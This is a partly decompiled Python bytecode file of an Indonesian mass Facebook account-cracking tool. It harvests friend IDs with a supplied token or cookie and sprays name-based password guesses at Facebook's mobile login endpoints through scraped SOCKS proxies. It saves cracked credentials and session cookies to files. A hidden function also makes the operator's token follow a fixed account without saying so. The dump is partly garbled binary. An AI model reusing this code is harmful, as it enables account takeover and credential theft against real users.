o
    �(�b    �                   @   sP  d d� Z e � r	d�Z ddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
Z
ddlZddlZddlmZ ddlmZ ddlmZ ddlmZ ddlmZ ddlmZ dd	lmZ dd
lmZ ddlmZ ddl m!Z" ddl#m$Z% ddlmZ& ddlm'Z' ddl(m)Z* zddlZW n e+y�   eed�� e�,d� Y nw zddlZW n e+y�   eed�� e�,d� Y nw e'�-�  e� Z.g Z/g Z0g Z1e�2� Z3g Z4ze�5d�j6Z7e8dd��9e7� W n e:y� Z; z
ed� W Y dZ;[;ndZ;[;ww e8dd��<� �=� Z7dd� Z>e?d�D ]�Z@dZAe�Bdd�ZCe�Bdd�ZDdZEe�Bd d!�Z;d"ZFe�Bdd�ZGe�Bdd#�ZHe�Bdd#�ZIe�Bdd#�ZJd$ZKeA� eC� d%eD� d&eE� e;� eF� eG� d%eH� d%eI� d%eJ� d&eK� �ZLe/�MeL� d'ZNe�Og d(��ZCd)ZDe�Og d*��ZEe�Bdd+�Z;e�Og d*��ZFd,ZGe�Bd-d �ZHd.ZIe�Bd/d0�ZJe�Bd1d2�ZKd3ZPeN� d&eC� d4eD� eE� e;� eF� d5eG� eH� d%eI� d%eJ� d%eK� d&eP� �ZQ�qe?d6�D ]eZRd7ZAe�Bd d!�ZCe�Bd d!�ZDe�Og d*��ZEe�Og d*��Z;e�Og d*��ZFe�Og d*��ZGe�Bdd�ZHd8ZIe�Bdd�ZJe�Bdd�ZKd9ZPeA� eC� d:eD� eE� e;� eF� eG� eH� eI� eJ� d%eK� d&eP� �ZSe0�MeS� �q�d;d<� ZLg g dddg g g g g g g g f\ZTZUaVaWaXZYZZZ[Z\Z]Z^Z_Z`g Z1g g ZaZbd=Zcd>Zdd?Zed@ZfdAZgdBZhdCZidDZjdEZkdFZldGZRd>ZmdHZKd?ZHdIZndJZodKZpdCZCdLZqe�OemeKeHeoeCg�ZrdMdNdOdPdQdRdSdTdUdVdWdXdY�ZsdMdNdOdPdQdRdSdTdUdVdWdZd[�Ztej�u� jvZwesexej�u� jy� Zzej�u� j{Z|d\exew� d] exez� d] exe|� d^ Z}d_exew� d] exez� d] exe|� d^ Z~d`da� Zdbdc� Z�ddde� Z�dfdg� Z�dhdi� Z�djdk� Z�dldm� Z�dndo� Z�dpdq� Z�drds� Z�dtdu� Z�dvdw� Z�dxdy� Z�dzd{� Z�d|d}� Z�d~d� Z�e�d�k�r&e��  dS dS )�c                   C   s   d S )N� r   r   r   �<Mr-XsZ>�<lambda>   �    r   �OOOOOOOOOOOOOOO�    N��Table��Console��BeautifulSoup��ThreadPoolExecutor��Group��Panel��print��Markdown��Columns��pretty��Text�&   	• Sedang Menginstall Modul Rich •�python -m pip install rich�*   	• Sedang Menginstall Modul Requests •�python -m pip install requests �whttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all�	.prox.txt�w�.   [[[1;92m•[1;97m] [[1;96mAlvino_adijaya_xy�rc                 C   sD   dd� }|� r	d�}| d D ]}t j�|� t j��  t�d� qd S )Nc                   S   s   d S )Nr   r   r   r   r   r   1   r   �jalan.<locals>.<lambda>r   �
���Q��?)�sys�stdout�write�flush�time�sleep)�z�
OOOOOOOOOO�er   r   r   �jalan0   s    

�r2   �'  �!Mozilla/5.0 (Symbian/3; Series60/�   �	   �Nokia�d   �'  �l/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   �Mobile Safari/535.1�.� �Mozilla/5.0 (Linux; U; Android��6�7�8�9�10�11�12� en-us; GT-��A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Z��  �.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0�h  �$  �(   �   �Mobile Safari/537.36�; �) �
   �"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S�C; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/�Mobile WVGA SMM-MMS/1.2.0 OPN-B�/c                  C   s�   dd� } | � r	d�} zt dd��� �� }|D ]}t�|� qW d S    t�d�j}t dd�}t�	d	t
|��}|D ]	}|�|d
 � q8t dd��� �� }Y d S )Nc                   S   s   d S )Nr   r   r   r   r   r   e   r   �uaku.<locals>.<lambda>r   �	bbnew.txtr%   �0https://github.com/EC-1709/a/blob/main/bbnew.txt�
.bbnew.txtr#   �line">(.*?)<r'   )�open�read�
splitlines�ugen�append�requests�get�text�re�findall�strr+   )r0   �ua�ub�a�aa�unr   r   r   �uakud   s    
�
r�   �[1;97m�[1;91m�[1;92m�[1;93m�[1;94m�[1;95m�[1;96m�[0m�[1;30m�[41m[1;97m�[m�[93m�[32m�[95m�[33m�[0;34m�January�February�March�April�May�June�July�August�	September�October�November�December��1�2�3�4�5rA   rB   rC   rD   rE   rF   rG   �Devember��01�02�03Z04Z05Z06Z07Z08Z09rE   rF   rG   �OK-�-�.txt�CP-c                 C   sD   dd� }|� r	d�}| d D ]}t j�|� t j��  t�d� qd S )Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �alvino_xy.<locals>.<lambda>r   r'   皙�����?)r)   r*   r+   r,   r-   r.   )�ur0   r1   r   r   r   �	alvino_xy�   s    r�   c                  C   s    dd� } | � r	d�} t �d� d S )Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �clear.<locals>.<lambda>r   �clear)�os�system)r0   r   r   r   r�   �   s    r�   c                  C   s   dd� } | � r	d�} t �  d S )Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �back.<locals>.<lambda>r   )�login)r0   r   r   r   �back�   s    r�   c                  C   s*   dd� } | � r	d�} t �  t�  td� d S )Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �banner.<locals>.<lambda>r   ��
 _______  ______ _______ _______ _     _
 |       |_____/ |_____| |       |____/ 
 |_____  |    \_ |     | |_____  |    \_

Chanel Tele : https://t.me/Termuxzts

)r�   �solr   )r0   r   r   r   �banner�   s    
r�   c                  C   s�   dd� } | � r	d�} zgt dd��� }t dd��� }t�|� z&tjdtd  d	|id
�}t�|j�d }t�|j�d }t	||� W W d S  t
yQ   t�  Y W d S  tjjyp   d}t|dd�}t� j|dd� t�  Y W d S w  ty}   t�  Y d S w )Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �login.<locals>.<lambda>r   �
.token.txtr%   �.cok.txt�:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookies�name�id�2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN�red�Zstyle�cyan)ry   rz   �tokenkur}   r~   r   �json�loadsr�   �menu�KeyError�login_lagi334�
exceptions�ConnectionError�markr�   r   �exit�IOError)r0   �token�cok�sy�sy2�sy3�li�lor   r   r   r�   �   s*    

��r�   c                  C   sP  dd� } | � r	d�} zst �d� t�  ttd�� t�ttt	t
tg�}tdt	� dt� d|� d	��}tjd
dddddddddd�	d|id�}t�d|j�}tdd��|�d��}t�  tdd��|�}tdt� dt	� dt� dt	� d�	� t�d� t�  W d S  ty� } zt �d � t �d!� td"tttttf � t�  W Y d }~d S d }~ww )#Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �login_lagi334.<locals>.<lambda>r   r�   �8   	©©© Saran Ektensi : [green]Cookiedough[white] ©©©�  [�   •�] Masukkan Cookies :r>   �0https://business.facebook.com/business_locations��Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36�https://www.facebook.com/�business.facebook.com�https://business.facebook.comr�   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0��text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8�text/html; charset=utf-8�	�
user-agent�refererZhost�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typer�   ��headersr�   �	(EAAG\w+)r�   r#   r5   r�   r'   �[�]� LOGIN BERHASIL�rm -f .token.txt�rm -f .cok.txt�6  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s)r�   r�   r�   �cetak�nel�random�choice�m�k�h�br�   �input�xr~   r   r�   �searchr�   ry   r+   �group�botr   r-   r.   r�   �	Exception)r0   �asur�   �data�
find_token�kenr�   r1   r   r   r   r�   �   s&    

(,

�r�   c                  C   s4   dd� } | � r	d�} z
t �dt � W d S    Y d S )Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �bot.<locals>.<lambda>r   �Ehttps://graph.facebook.com/atri910?fields=subscribers&access_token=%s)r~   �postr�   )r0   r   r   r   r  �   s
    
r  c           
      C   s�  dd� }|� r	d�}z	t �d��� }W n   ddi}Y z%t�d�d }ttt�d�d	 � }t�d�d
 }|d | d | }W n   d}Y t�  t�  t �d�j	}t
td t d t d � t
td t d t d � t
td t d t d � t
td t d t d � ttd t d t d �}	|	dv r�t�  d S |	dv r�t�  d S |	dv r�t�  d S |	dv r�t�  d S |	dv r�t�  d S |	dv r�t�d� t�d� t
d � t�  d S t
d!� t�  d S )"Nc                   S   s   d S )Nr   r   r   r   r   r   �   r   �menu.<locals>.<lambda>r   �https://httpbin.org/ipr�   r�   rs   r5   r   �   r>   �https://api.ipify.org�
[r�   �] Crack Masal  r�   r�   �] Check Hasil Crack    r�   �] Check Opsi    rg   �	] Logout r�   �] Select : �r�   �r�   �r�   �r�   �rg   �rm -rf .token.txt�rm -rf .cookie.txt�>> Sukses Logout+Hapus Kukis �>> Pilih Yang Bener Asu )r~   r   r�   �my_birthday�split�dic2r�   r�   r�   r�   r   r  r	  r  �dump_massal�gabut�main�resultr�   r�   r�   r�   )
�my_name�my_idr0   �sh�tglx�blnx�thnx�birth�ip�_____alvino__adijaya_____r   r   r   r�   �   sD    








r�   c                  C   s8   dd� } | � r	d�} t t� dt� �� t�d� t�  d S )Nc                   S   s   d S )Nr   r   r   r   r   r     r   �error.<locals>.<lambda>r   �$>> Maaf Fitur Ini Masih Di Perbaiki r;   )r   r  r  r-   r.   r�   )r0   r   r   r   �error  s    
r=  c                  C   s>  dd� } | � r	d�} t dt� dt� dt� dt� d�	� t d	t� d
t� dt� dt� d�	� t d	t� dt� d�� tdt� dt� d��}|dv �razt�d�}W n tyb   t d� t	�
d� t�  Y nw t|�dkrwt d� t	�
d� t�  d S d}i }|D ]k}ztd| d��� }W n   Y q}|d7 }|dk r�dt|� }|�t|�t|�i� |�|t|�i� t dt� dt� d�||t|�f � q}|�t|�t|�i� t d	t|� d  | d! tt|�� d" t � q}td#�}z|| }	W n t�y   t d$� t�  Y nw ztd|	 d��� �� }
W n   t d%� t	�
d� t�  Y d}tt|
��D ]}|
| �d&�}t t� t� |d � d&|d � �� |d7 }�q+t d� tt� d	t� d't� d(�� t�  d S |d)v �r�zt�d�}W n t�y�   t d%� t	�
d� t�  Y nw t|�dk�r�t d*� t	�
d� t�  d S d}i }|D ]i}ztd+| d��� }W n   Y �q�|d7 }|dk �r�d,t|� }|�t|�t|�i� |�|t|�i� t d-t� d.t� d/�||t|�f � �q�|�t|�t|�i� t dt� dt� d�||t|�f � �q�td0�}z|| }	W n t�y$   t d$� t�  Y nw ztd+|	 d��� �� }
W n   t d%� t	�
d� t�  Y d}tt|
��D ])}|
| �d&�}t d� t t� d1t� |d � d&|d � d&|d � �� |d7 }�qKt d� td	t� d2t� d3t� d'�� t�  d S |d4v �r�t�  d S t d$� t�  d S )5Nc                   S   s   d S )Nr   r   r   r   r   r     r   �result.<locals>.<lambda>r   r  r�   �] Hasil �OK� Anda r�   r�   �CP� Anda�00�	] Kembalir'   �>� : r%  �%   [{b}•{x}]{h} File Tidak Di Temukan �   r   �,   [{b}•{x}]{h} Anda Tidak Memiliki Hasil CP r  �CP/r%   r5   ro   � �	 %s. %s (� %s �Idz )�] � [ �
 Account ]�

 Pilih : �>> Pilih Yang Bener Kontol �>> File Tidak Di Temukan �|� Klik Enter� ]r"  � >> Anda Tidak Mempunyai File OK �OK/rg   �
 %s. %s ( �%s� Idz )�	
Pilih : �   ╰─── r�   r�   r#  )r   r	  r  r  r  r
  r�   �listdir�FileNotFoundErrorr-   r.   r�   �lenry   �	readlinesr�   �updater�   rz   r{   �ranger,  r  )r0   �kz�vin�cih�lol�isi�hem�nom�geeh�geh�lin�nocp�cpku�cpkunir   r   r   r1    s�    
""

�



&2�

"


�



((�

.


r1  c               
   C   sF  dd� } | � r	d�} zt dd��� }t dd��� }W n ty%   t�  Y nw ztttd t d t d	 ��}W n tyH   t	d
� t�  Y nw |dk sQ|dkrXt	d� t�  t
�� }d}t|�D ]}|d7 }ttd t d t d t|� d �}t�|� qbtD ]W}z9|jd| d td  d|id��� }	|	d d D ]}
z|
d d |
d  }|tv r�nt�|� W q�   Y q�W q� ttfy�   Y q� t
jjy�   t	d� t�  Y q�w zt	td t d t d ttt�� � t�  W d S  t
jj�y
   t	d� t�  Y d S  ttf�y"   t	d � t�d!� t�  Y d S w )"Nc                   S   s   d S )Nr   r   r   r   r   r   s  r   �dump_massal.<locals>.<lambda>r   r�   r%   r�   r  �?�] Jumlah Target : �% Masukkan Angka Anjing, Malah Huruff r5   r8   � Gagal Dump Idz r   r�   rF  �] Id Ke rG  � https://graph.facebook.com/v2.0/�)?fields=friends.limit(5000)&access_token=r�   r�   �friendsr  r�   rV  r�   � Sinyal Loh Kek Kontoll r�   �#] Total Id yang terkumpul : [1;92m� Sinyal Lo kek Kontol � Pertemanan Tidak Public rI  )ry   rz   r�   r�   �intr  r  r	  �
ValueErrorr   r~   �Sessionre  r�   �uidr}   r   r�   r�   r�   r�   r�   r�   rb  �settingr�   r-   r.   )r0   r�   r�   �jum�ses�yz�met�kl�userr�col�mi�isor   r   r   r.  r  sb    
�
$�
(&
�
�
(
�r.  c               	   C   s  dd� } | � r	d�} t d�}z^tjd|� dt� �td��� }|d d	 D ]>}z7zt�|d
 d |d  � W n   t�|d d |d  � Y tdt	t� dd� t
j��  t�d� W q#   Y q#td� t�  W d S  ttfy�   tdt� dt� d�� Y d S w )Nc                   S   s   d S )Nr   r   r   r   r   r   �  r   �crack_foll.<locals>.<lambda>r   �)  pastikan akun bersifat publik 
 akun : �https://graph.facebook.com/�Q?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token=r�   �subscribersr  �usernamerV  r�   r�   � sedang dump %s idr>   ��end�-C��6*?�� [rF  �] akun tidak publik)r  r�  r   �t�cr�   �dumpr}   r   rb  r)   r*   r,   r-   r.   r�  r�   r�   r�   rV   rY   )r0   �akun�bas�pir   r   r   �
crack_foll�  s"    
 "

�r�  c            	      C   s�  dd� } | � r	d�} t td t d t d � t td t d t d	 � ttd t d
 t d �}|dv r`g }tt�D ]}|�|� q=t|�}|d }t|�D ]}t	�|| � |d8 }qQn|dv rxtD ]}t
�dtt	��}t	�||� qfnt d� t�  t td t d t d � t td t d t d � ttd t d
 t d �}|dv r�t�d� n%|dv r�t d� t�  n|dv r�t�d� n|dv r�t�d� nt�d� t�  d S )Nc                   S   s   d S )Nr   r   r   r   r   r   �  r   �setting.<locals>.<lambda>r   r  r�   �] Akun New  r�   r�   �] Akun Random  r�   r!  �r�   r�   r5   �r�   r�   r   � Pilih Yang Bener Kontooll �!] M.Facebook [1;92m(Rekomendasi)�] X.Facebook�mobile�rL  � Pilih Yang Bener Kontol �r�   r�   �free�mbasic)r   r  r	  r  �sortedr�   r}   rb  re  �id2r  �randint�insertr�   �methodr�  �passwrd)	r0   �hu�muda�bacot�bcm�bcmi�xmud�xx�hcr   r   r   r�  �  sF    
�
�r�  c                  C   s�  dd� } | � r	d�} t dt� dt� dt� �t � t dt� dt� dt� d	�t � td
d���}tD ]�}|�d�d |�d�d �� }}|�d�d }g d�}t	|�dk rqt	|�dk r[n<|�
|d � |�
|d � |�
|d � n&t	|�dk r}|�
|� n|�
|� |�
|d � |�
|d � |�
|d � dtv r�tD ]}|�
|� q�n	 dtv r�|�t||� q0dtv r�|�t||� q0|�t||� q0t�  W d   � d S 1 s�w   Y  d S )Nc                   S   s   d S )Nr   r   r   r   r   r   �  r   �passwrd.<locals>.<lambda>r   r  rF  � ] Hasil OK Tersimpan Di : OK/%s r�   � ] Hasil CP Tersimpan Di : CP/%s r'   �   �Zmax_workersrV  r   r5   r>   �ZsayangZ	katasandiZsayangkuZ
sayangkamu�   rI  �123�1234�12345�yar�  r�  )r   r	  r  �okc�cpc�tredr�  r,  �lowerrb  r}   �pwpluss�pwnyar�  �submit�crackr�  �crackmbasicr�   )r0   �pool�yuzong�idf�nmf�frs�pwv�xpwdr   r   r   r�  �  s@    
 "
��r�  c                 C   s�  dd� }|� r	d�}t �ttttttg�}tj	�
d�g d�t� �d�t� �d�t� �t� �t� �t� �t� �d�t� �tt�� �t� �d�t� �d	�t� �t� �t� �d�t� �d
�t� �t� �t� �d�|� �d�tttt�� �� �t� �d���f tj	��  t �t�}t�� }|D �]?}�z+t �t�}dd| i}|j�dddd|dddddd�
� |�d|  d �}	t�dt|	j ���!d�t�dt|	j ���!d�| dd|d �}
d!�d"d#� |	j"�#� �$� D ��}|d$7 }i d%d�d&d�d'd(�d)d�d*d+�d,d�d-d.�d/d0�d1|�d2d�d3d4�d5d�d6d�d7d�d8d|  d9 �d:d;�d<d�}|j%d=|
d>|i|d?|d@�}dA|j"�#� �&� v �rjt'dB| � dC|� t(� dD|� dE�� t)dFt* dG��
| dC | dC | dH � t+�,| dC | � td7 aW  ncdI|j"�#� �&� v �r�td7 a|j"�#� }d!�dJd#� |j"�#� �$� D ��}t'dK| � dC|� t(� dL|� dM|� dE�
� t)dNt- dG��
| dC | dC | dC | dH � W  nW q� tj.j/�y�   t0�1d� Y q�w td7 ad S )ONc                   S   s   d S )Nr   r   r   r   r   r     r   �crackmbasic.<locals>.<lambda>r   rL  �   🕕 r�  r>   rs   �OK-:�CP-:�  �{:.0%}�http�	socks5://�x.facebook.comr�   �?1r�   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�same-origin�cors�emptyr�   �
�Hostr�   �sec-ch-ua-mobiler�   r�   r�   �sec-fetch-site�sec-fetch-mode�sec-fetch-destr�   �8https://x.facebook.com/login/device-based/password/?uid=�h  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr�name="lsd" value="(.*?)"r5   �name="jazoest" value="(.*?)"�"  https://x.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified�login_no_pin�ZlsdZjazoestr�  �nextZflow�pass�;c                 S   s   g | ]
\}}d ||f �qS )�%s=%sr   )�.0�key�valuer   r   r   �
<listcomp>  r   �crackmbasic.<locals>.<listcomp>�  m_pixel_ratio=2.625; wd=412x756r�  r�   �	sec-ch-ua�(" Not A;Brand";v="99", "Chromium";v="98"r�  �sec-ch-ua-platform�	"Android"r�   r�   �https://x.facebook.comr�   �!application/x-www-form-urlencodedr�   r�   �x-requested-with�XMLHttpRequestr�  r�  r�  r�   �h  &flow=login_no_pin&next=https%3A%2F%2Fx.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr�accept-encoding�gzip, deflate, brr�   �Qhttps://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDr�   F�r  r�   r�   Zallow_redirectsZproxies�
checkpoint�
   • [93mrV  �   
• [1;91mr'   rK  r�   �|
�c_userc                 S   s   g | ]
\}}d ||f �qS )r�  r   )r�  r�  r�  r   r   r   r�  $  r   �>  �
>  [1;92m�

> [1;92mrZ  )2r  r  r  r  r	  r
  r�   r  r)   r*   r+   �joinrY   �looprb  r�   rQ   �ok�cp�format�floatr,   r|   r~   r�  �proxr�   rd  r   r�   r  r�   r�   r  r�   �get_dict�itemsr  �keysr   rW   ry   r�  r�  r}   r�  r�   r�   r-   r.   )r�  r�  r0   �bor�   r�  �pw�nip�proxs�p�dataa�koki�heade�po�coki�kukir   r   r   r�    sF    
�



":r (
&0�r�  c                 C   s  dd� }|� r	d�}t �ttttttg�}tj	�
d�g d�t� �d�t� �d�t� �t� �t� �t� �t� �d�t� �tt�� �t� �d	�t� �d
�t� �t� �t� �d	�t� �d�t� �t� �t� �d�|� �d�tttt�� �� �t� �d���f tj	��  t �t�}t�� }|D �]v}�zbt �t�}dd| i}|j�dddd|dddddd�
� |�d|  d �}	t�dt|	j ���!d�t�dt|	j ���!d�| dd |d!�}
d"�d#d$� |	j"�#� �$� D ��}|d%7 }i d&d�d'd�d(d)�d*d�d+d,�d-d�d.d/�d0d1�d2|�d3d�d4d5�d6d�d7d�d8d�d9d|  d �d:d;�d<d�}|j%d=|
d>|i|d?|d@�}dA|j"�#� �&� v �r�t'dt(� dBt� dCt(� | � t� dDt(� dBt� dEt(� |� dFt� dGt(� dBt� dHt)� |� t� dI�� t*dJt+ dK��
| dL | dL | dM � t,�-| dL | � td7 aW  n}dN|j"�#� �&� v �r�td7 a|j"�#� }d"�dOd$� |j"�#� �$� D ��}t'dt(� dPt� dCt(� | � t� dDt(� dPt� dEt(� |� dFt� dGt(� dPt� dQt(� |� t� dI�� t*dRt. dK��
| dL | dL | dL | dM � W  nW q� tj/j0�y   t1�2d� Y q�w td7 ad S )SNc                   S   s   d S )Nr   r   r   r   r   r   /  r   �crack.<locals>.<lambda>r   rL  �[�!�] _dre rs   r>   �OK:�CP:r�  r�  r�  r�  �m.facebook.comr�   r�  r�   r�  r�  r�  r�  r�   r�  �8https://m.facebook.com/login/device-based/password/?uid=r�  r�  r5   r�  �"  https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecifiedr�  r�  r�  c                 S   s   g | ]
\}}d ||f �qS )r�  r   )r�  r�  r�  r   r   r   r�  @  r   �crack.<locals>.<listcomp>r�  r�  r�   r�  r�  r�  r   r  r�   r�   �https://m.facebook.comr�   r  r�   r�   r  r  r�  r�  r�  r�   r  r  r�   �Qhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDr�   Fr
  r  rF  �] email  : �          
[�] sandi  : �
          r  �] user agent : r'   rK  r�   rV  r  r  c                 S   s   g | ]
\}}d ||f �qS )r�  r   )r�  r�  r�  r   r   r   r�  M  r   �   ✓�] cookie : rZ  )3r  r  r  r  r	  r
  r�   r  r)   r*   r+   r  rY   r  rb  r�   rQ   r  r  r  r  r,   r|   r~   r�  r  r�   rd  r   r�   r  r�   r�   r  r�   r  r  r  r  r   �hh�kkry   r�  r�  r}   r�  r�   r�   r-   r.   )r�  r�  r0   r  r�   r�  r  r  r   r!  r"  r#  r$  r%  r&  r'  r   r   r   r�  .  sF    
�



":rZ(
Z0�r�  �__main__)�r0   r~   �bs4r�   r�   r)   r  �datetimer-   r�   �urllib3�rich�base64�
rich.tabler   �me�rich.consoler
   r�   r   �sop�parser�concurrent.futuresr   r�  r   �gp�
rich.panelr   r  r   r  �rich.markdownr   r�   �rich.columnsr   r�  �rprintr   �	rich.textr   �tekz�ImportErrorr�   �install�CON�ugen2r|   �cokbrutr�  r�  �princpr   r�   r  ry   r+   r  r1   rz   r{   r2   re  �xdr�   �	randranger
  r�  �d�f�gr	  �i�jr  r�   r}   r�   r  �l�uaku2r  �uakr�   r�  r  r  r  r�  �oprekr�  �	lisensiku�	taplikasir�   r�  �lisensikunir�  r�  rY   rV   rQ   rT   rK   r^   rX   rW   rc   �sirr  r;  r�   r<  r!  r  �dicr-  �now�day�tglr�   �month�bln�year�thnr�  r�  r�   r�   r�   r�   r�   r�   r  r�   r=  r1  r.  r�  r�  r�  r�  r�  �__name__r   r   r   r   �<module>   s   
H���<
F:8
(('d/*%'+
�